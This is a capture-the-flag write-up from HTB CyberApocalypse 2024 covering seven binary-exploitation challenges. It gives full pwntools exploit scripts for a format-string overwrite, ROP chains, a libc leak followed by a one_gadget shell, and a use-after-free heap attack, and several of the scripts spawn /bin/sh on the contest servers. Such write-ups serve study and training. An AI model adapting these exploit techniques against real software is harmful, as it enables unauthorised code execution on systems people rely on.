---
title: HTB CyberApocalypse 2024 - Pwn (9/10 Solved)
date: '2024-03-08'
draft: false
authors: ['itoid', 'zran']
tags: ['Pwn']
summary: HTB CyberApocalypse 2024 Pwn writeup by itoid & zran (9/10)
---

# 1. Tutorial (_very easy_)

Given questions about integer overflows, we just need to answer them accordingly

```python
from pwn import *
exe = './test'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.58.224 52022".split(" ")[1:3]
io = remote(host, port)
io.sendlineafter(b'>> ', b'y')
io.sendlineafter(b'>> ', b'2147483647')
io.sendlineafter(b'>> ', b'-2147483648')
io.sendlineafter(b'>> ', b'-2')
io.sendlineafter(b'>> ', b'integer overflow')
io.sendlineafter(b'>> ', b'-2147483648')
io.sendlineafter(b'>> ', b'1337')
io.interactive()
```

![image](https://hackmd.io/_uploads/HyFlqGJRT.png)

Flag: `HTB{gg_3z_th4nk5_f0r_th3_tut0r14l}`

# 2. Delulu (_very easy_)

There is a format string vulnerability in printf((const char \*)buf). We just need to overwrite v4[0] from 0x1337BABE to 0x1337BEEF by performing a two-byte overwrite. This will allow us to call the delulu() function and obtain the flag

![image](https://hackmd.io/_uploads/H1l6JdbA6.png)

![image](https://hackmd.io/_uploads/HJZyhmJRa.png)

```python
from pwn import *
exe = './delulu'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.56.26 52359".split(" ")[1:3]
io = remote(host, port)
io.sendline('%{}x%7$hn'.format(str(0x1337BEEF & 0xFFFF)).encode())
io.interactive()
```

![image](https://hackmd.io/_uploads/HJG-nG1AT.png)

Flag: `HTB{m45t3r_0f_d3c3pt10n}`

# 3. Writing on the Wall (_very easy_)

There is a one-byte overflow vulnerability on read(0, buf, 7uLL), and we can bypass strcmp(buf, s2) with a null byte because the strcmp() function stops at a null byte. Hence, by sending 7 null bytes, we can cause strcmp() to evaluate as true and call the open_door() function, which displays the flag on the screen

![image](https://hackmd.io/_uploads/rkkIhmyC6.png)

![image](https://hackmd.io/_uploads/Bkyw3XkCT.png)

```python
from pwn import *
exe = './writing_on_the_wall'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.62.241 38688".split(" ")[1:3]
io = remote(host, port)
io.sendline(b'\0' * 0x7)
io.interactive()
```

![image](https://hackmd.io/_uploads/Hkhppf1RT.png)

Flag: `HTB{3v3ryth1ng_15_r34d4bl3}`

# 4. Pet Companion (_easy_)

There is a buffer overflow vulnerability on read(0, buf, 256uLL)

![image](https://hackmd.io/_uploads/Skuypm1Ap.png)

I used ret2csu to leak the libc's write address. Then, I constructed a ROP chain to achieve arbitrary code execution

![image](https://hackmd.io/_uploads/H1GuVdW06.png)

```python
from pwn import *
exe = './pet_companion'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 83.136.254.16 55249".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
libc = ELF("./glibc/libc.so.6", checksec = 0)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec = 0)

p = cyclic(0x48)
p += p64(0x40073a)
p += p64(0x0)
p += p64(0x1)
p += p64(0x600fd8)
p += p64(0x1)
p += p64(0x600fd8)
p += p64(0x6)
p += p64(0x400720)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x0)
p += p64(0x40064a)
sla(b'current status: ', p)
rud(b'...\n')
rl()
leaked = u64(lj(rud(b'\n'), 8, b'\0'))
assert leaked & 0xfff == 0x0f0
li(f"Leaked: {hex(leaked)}")
libc.address = leaked - 0x1100f0
li(f"Libc address: {hex(libc.address)}")
assert libc.address & 0xfff == 0
p = flat(cyclic(0x48), libc.address + 0x4f2a5) # execve("/bin/sh", rsp+0x40, environ)
sl(p)
com()
```

![image](https://hackmd.io/_uploads/Bk2xJ71Cp.png)

Flag: `HTB{c0nf1gur3_w3r_d0g}`

# 5. Rocket Blaster XXX (_easy_)

There is a buffer overflow vulnerability in read(0, buf, 0x66uLL). Additionally, there is a function named fill_ammo() that displays the flag on the screen if the Destination Index Register, Source Index Register, and Data Register meet the requirements based on the code when we call the fill_ammo() function. Therefore, we just need to create a ROP chain to exploit this vulnerability

![image](https://hackmd.io/_uploads/SJwU6myCT.png)

![image](https://hackmd.io/_uploads/r1HBBObAp.png)

```python
from pwn import *
exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.51.96 42628".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()

p = cyclic(0x28)
p += p64(0x000000000040101a)
p += p64(0x000000000040159f)
p += p64(0xDEADBEEF)
p += p64(0x000000000040159d)
p += p64(0xDEADBABE)
p += p64(0x000000000040159b)
p += p64(0xDEAD1337)
p += p64(0x00000000004012f5)
sla(b'>> ', p)
com()
```

![image](https://hackmd.io/_uploads/rkse-m1A6.png)

Flag: `HTB{b00m_b00m_r0ck3t_2_th3_m00n}`

# 6. Sound of Silence (_medium_)

> There is a buffer overflow vulnerability upon calling the function gets(v4, argv)

![image](https://hackmd.io/_uploads/Skdp6XkCa.png)

The Executable and Linkable Format (ELF) also has the system function in its Procedure Linkage Table. Based on my observation, our input will be stored in the Accumulator Register. Therefore, I input the string "/bin/sh\0" and then use the instruction mov rdi, rax, so it calls system("/bin/sh"), allowing us to achieve arbitrary code execution

![image](https://hackmd.io/_uploads/HyjT8uW0a.png)

```python
from pwn import *
exe = './sound_of_silence'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 94.237.62.149 33617".split(" ")[1:3]
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
p = lj(b'/bin/sh\0', 0x28, b'\0')
p += p64(0x000000000040101a) * 0x2
p += p64(0x0000000000401169)
sla(b'>> ', p)
com()
```

![image](https://hackmd.io/_uploads/rJCvXQ1Ra.png)

Flag: `HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}`

# 7. Deathnote (_medium_)

Given a fully mitigated Executable and Linkable Format (ELF), there is an 'add' function that allows us to add data to an index, a 'show' function to display the data at an index, and a 'delete' function to remove previously stored data at an index

![image](https://hackmd.io/_uploads/SJSCuu-Cp.png)

![image](https://hackmd.io/_uploads/BkhkTPZCp.png)

![image](https://hackmd.io/_uploads/S1OZTDZ0T.png)

![image](https://hackmd.io/_uploads/S1cfpwZCa.png)

There is a use-after-free vulnerability where free(_(void \*\*)(8LL _ num + a1)) can result in the reuse of a previously released block of memory

![image](https://hackmd.io/_uploads/SymETw-Aa.png)

On the \_ function, there is v2 = (void (\_\_fastcall _)(\_QWORD))strtoull(_(const char \*_)a1, 0LL, 16) that converts our hexadecimal string to an unsigned long, and then calls v2(_(\_QWORD \*)(a1 + 8)). We can overwrite v2 to system and a1 + 8 to the string "/bin/sh", resulting in system("/bin/sh") and allowing us to achieve arbitrary code execution

![image](https://hackmd.io/_uploads/ryZDTvW06.png)

```python
from pwn import *
exe = './deathnote'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc 83.136.252.248 33320".split(" ")[1:3]
context.log_level = 'debug'
libc = ELF("./glibc/libc.so.6", checksec = 0)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec = 0)
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()

def create(size: bytes, idx: bytes, data: bytes):
	sla('💀 ', b'1')
	sla('💀 ', e(str(size)))
	sla('💀 ', e(str(idx)))
	sla('💀 ', data)

def remove(idx: bytes):
	sla('💀 ', b'2')
	sla('💀 ', e(str(idx)))

def show(idx: bytes):
    sla('💀 ', b'3')
    sla('💀 ', e(str(idx)))
    rud(b'Page content: ')
    show = rud(b'\n')
    li(f"Leaked: {show}")
    return show

def exit():
	sla('💀 ', b'42')

def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def obfuscate(p, adr):
    return p^(adr>>12)

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def www_tcache_poisoning(where, what):
    create_small(b'')
    create_small(b'')
    delete(2)
    delete(1)
    addr = deobfuscate(view(1))
    log.info(f"addr @ 0x{addr:x}")
    edit(1, p64(where ^ (addr >> 12)))
    create_small(b'')
    create_small(b'')
    edit(4, what)

for i in range(0, 7, 1):
    create(0x80, i, b'')
remove(0)
heap = u64(lj(show(0), 8, b'\0')) << 12
li(f"heap @ {hex(heap)}")
create(0x80, 0, b'YY')
create(0x80, 7, b'YY')
create(0x80, 8, b'YY')
create(0x10, 9, b"/bin/sh\0")
for i in range(0, 7, 1):
    remove(i)
remove(8)
remove(7)
leaked = u64(lj(show(8), 8, b'\0'))
libc.address = leaked - 0x219ce0 - 0x1000
assert libc.address & 0xfffffffffffff000
li(f"Libc Address: {hex(libc.address)}")
create(0x80, 0, e(str(hex(libc.address + 0x50d70)[2:])))
create(0x80, 1, b'/bin/sh')
exit()
com()
```

![image](https://hackmd.io/_uploads/rJVtsPWRp.png)

Flag: `HTB{0m43_w4_m0u_5h1nd31ru~uWu}`
